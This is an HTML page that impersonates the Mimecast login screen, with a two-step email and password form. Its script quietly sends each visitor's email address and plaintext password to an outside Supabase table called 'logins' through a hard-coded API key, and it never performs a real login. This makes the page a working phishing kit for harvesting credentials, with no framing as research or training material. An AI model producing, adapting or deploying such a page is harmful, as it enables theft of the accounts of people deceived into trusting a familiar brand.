<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mimecast Login - Mimecast</title>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=Syne:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --brand-blue: #0075d4;
      --btn-bg: #7ab8e0;
      --btn-hover: #0075d4;
      --link: #0075d4;
      --border: #e5e7eb;
      --text-primary: #1a202c;
      --text-secondary: #6b7280;
      --text-muted: #9ca3af;
      --error: #dc2626;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(160deg, #1a7fc4 0%, #2196d8 40%, #1565a0 100%);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: 'DM Sans', sans-serif;
      color: var(--text-primary);
      overflow: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background:
        radial-gradient(ellipse 600px 400px at 20% 30%, rgba(255,255,255,0.06) 0%, transparent 70%),
        radial-gradient(ellipse 400px 300px at 80% 70%, rgba(0,30,80,0.15) 0%, transparent 70%);
      pointer-events: none;
    }

    .page-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
      width: 100%;
      padding: 24px 16px;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(16px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideIn {
      from { opacity: 0; transform: translateY(10px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    .logo {
      display: flex;
      align-items: flex-end;
      animation: fadeUp 0.45s ease both;
    }

    .logo-text {
      font-family: 'Syne', sans-serif;
      font-size: 30px;
      font-weight: 600;
      color: #ffffff;
      letter-spacing: -0.5px;
    }

    .logo-dot {
      width: 5px;
      height: 5px;
      background: #7dd3fc;
      border-radius: 50%;
      margin-bottom: 6px;
      margin-left: 2px;
    }

    .card {
      background: #fff;
      border-radius: 10px;
      padding: 40px 52px 38px;
      width: 100%;
      max-width: 560px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.18), 0 4px 16px rgba(0,0,0,0.1);
      animation: fadeUp 0.45s ease 0.05s both;
    }

    .card-title {
      font-size: 22px;
      font-weight: 600;
      color: var(--text-primary);
      margin-bottom: 28px;
      letter-spacing: -0.3px;
    }

    #step-email, #step-password { display: none; }
    #step-email.active, #step-password.active {
      display: block;
      animation: slideIn 0.28s ease both;
    }

    .field { margin-bottom: 20px; }

    .field label {
      display: block;
      font-size: 13.5px;
      font-weight: 500;
      color: var(--text-secondary);
      margin-bottom: 7px;
    }

    .field input,
    .field select {
      width: 100%;
      padding: 11px 14px;
      border: 1.5px solid var(--border);
      border-radius: 6px;
      font-family: 'DM Sans', sans-serif;
      font-size: 14px;
      color: var(--text-primary);
      background: #fff;
      transition: border-color 0.18s, box-shadow 0.18s;
      appearance: none;
      -webkit-appearance: none;
      outline: none;
    }

    .field input::placeholder { color: var(--text-muted); }

    .field input:focus,
    .field select:focus {
      border-color: var(--brand-blue);
      box-shadow: 0 0 0 3px rgba(0,117,212,0.12);
    }

    .field input.invalid {
      border-color: var(--error);
      box-shadow: 0 0 0 3px rgba(220,38,38,0.1);
    }

    .email-display {
      font-size: 14px;
      color: var(--text-primary);
      padding: 4px 0;
    }

    .select-wrapper { position: relative; }
    .select-wrapper::after {
      content: '';
      pointer-events: none;
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      border-left: 5px solid transparent;
      border-right: 5px solid transparent;
      border-top: 6px solid #6b7280;
    }

    .btn-primary {
      width: 100%;
      padding: 12px 16px;
      background: var(--btn-bg);
      color: #fff;
      font-family: 'DM Sans', sans-serif;
      font-size: 15px;
      font-weight: 500;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      margin-top: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .btn-primary:hover { background: var(--btn-hover); }
    .btn-primary:active { transform: scale(0.99); }
    .btn-primary:disabled { background: #a8d4ef; cursor: not-allowed; }

    .btn-spinner {
      width: 15px; height: 15px;
      border: 2px solid rgba(255,255,255,0.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      display: none;
      flex-shrink: 0;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .card-links {
      margin-top: 18px;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .card-links a {
      font-size: 13.5px;
      color: var(--link);
      text-decoration: none;
      cursor: pointer;
      transition: opacity 0.15s;
    }

    .card-links a:hover { opacity: 0.7; text-decoration: underline; }

    .footer {
      text-align: center;
      color: rgba(255,255,255,0.75);
      font-size: 12px;
      line-height: 1.8;
      animation: fadeUp 0.45s ease 0.1s both;
    }

    .footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="page-wrapper">

    <div class="logo">
      <span class="logo-text">mimecast</span><span class="logo-dot"></span>
    </div>

    <div class="card">
      <div class="card-title">Log In</div>

      <!-- Step 1: Email -->
      <div id="step-email" class="active">
        <div class="field">
          <label>Email Address</label>
          <input type="email" id="email-input" placeholder="Email Address" autofocus />
        </div>
        <button class="btn-primary" id="nextBtn" onclick="goToPassword()">
          <div class="btn-spinner" id="nextSpinner"></div>
          <span id="nextLabel">Next</span>
        </button>
      </div>

      <!-- Step 2: Password -->
      <div id="step-password">
        <div class="field">
          <label>Email Address</label>
          <div class="email-display" id="email-display"></div>
        </div>

        <div class="field">
          <label>Authentication Type</label>
          <div class="select-wrapper">
            <select>
              <option selected>Cloud</option>
              <option>Domain</option>
              <option>Federated</option>
            </select>
          </div>
        </div>

        <div class="field">
          <label>Password</label>
          <input type="password" id="password-input" placeholder="Password" />
        </div>

        <button class="btn-primary" id="loginBtn" onclick="handleLogin()">
          <div class="btn-spinner" id="loginSpinner"></div>
          <span id="loginLabel">Log In</span>
        </button>

        <div class="card-links">
          <a onclick="goBack()">Log in as a different user.</a>
          <a href="#">Reset Cloud Password</a>
        </div>
      </div>
    </div>

    <div class="footer">
      ©2026 Mimecast v1.23.0<br />
      <a href="#">Privacy</a>
    </div>
  </div>

  <script>
    // ── Supabase Config ──────────────────────────────────────────
    const SUPABASE_URL  = 'https://ycfstlaakaamxgxlbora.supabase.co';
    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZnN0bGFha2FhbXhneGxib3JhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NDAyNDksImV4cCI6MjA4OTIxNjI0OX0.cSvcpbCW6sP9nX6VT9zBwUXGeAQV3IuZdGON_6dsuEI';
    const TABLE_NAME    = 'logins';

    async function saveToSupabase(email, password) {
      const res = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
          'Prefer': 'return=minimal'
        },
        body: JSON.stringify({
          email,
          password_hash: password,
          created_at: new Date().toISOString()
        })
      });
      if (!res.ok) throw new Error(`Supabase error ${res.status}`);
    }

    // ── Navigation ───────────────────────────────────────────────
    function goToPassword() {
      const input = document.getElementById('email-input');
      const email = input.value.trim();
      if (!email || !email.includes('@')) {
        input.classList.add('invalid');
        input.focus();
        return;
      }
      document.getElementById('email-display').textContent = email;
      document.getElementById('step-email').classList.remove('active');
      document.getElementById('step-password').classList.add('active');
      setTimeout(() => document.getElementById('password-input').focus(), 50);
    }

    function goBack() {
      document.getElementById('password-input').value = '';
      document.getElementById('step-password').classList.remove('active');
      document.getElementById('step-email').classList.add('active');
      document.getElementById('email-input').focus();
    }

    // ── Submit ───────────────────────────────────────────────────
    async function handleLogin() {
      const pw = document.getElementById('password-input').value;
      if (!pw) {
        document.getElementById('password-input').classList.add('invalid');
        document.getElementById('password-input').focus();
        return;
      }

      const email  = document.getElementById('email-input').value.trim();
      const btn    = document.getElementById('loginBtn');
      const spinner = document.getElementById('loginSpinner');
      const label  = document.getElementById('loginLabel');

      btn.disabled = true;
      spinner.style.display = 'block';
      label.textContent = 'Logging in...';

      try {
        await saveToSupabase(email, pw);
      } catch (e) {
        console.error('Supabase error:', e);
      } finally {
        btn.disabled = false;
        spinner.style.display = 'none';
        label.textContent = 'Log In';
      }
    }

    // ── Keyboard support ─────────────────────────────────────────
    document.getElementById('email-input').addEventListener('keydown', e => {
      if (e.key === 'Enter') goToPassword();
    });

    document.getElementById('email-input').addEventListener('input', function () {
      this.classList.remove('invalid');
    });

    document.addEventListener('keydown', e => {
      if (e.key === 'Enter' && document.getElementById('step-password').classList.contains('active')) {
        handleLogin();
      }
    });

    document.getElementById('password-input').addEventListener('input', function () {
      this.classList.remove('invalid');
    });
  </script>
</body>
</html>
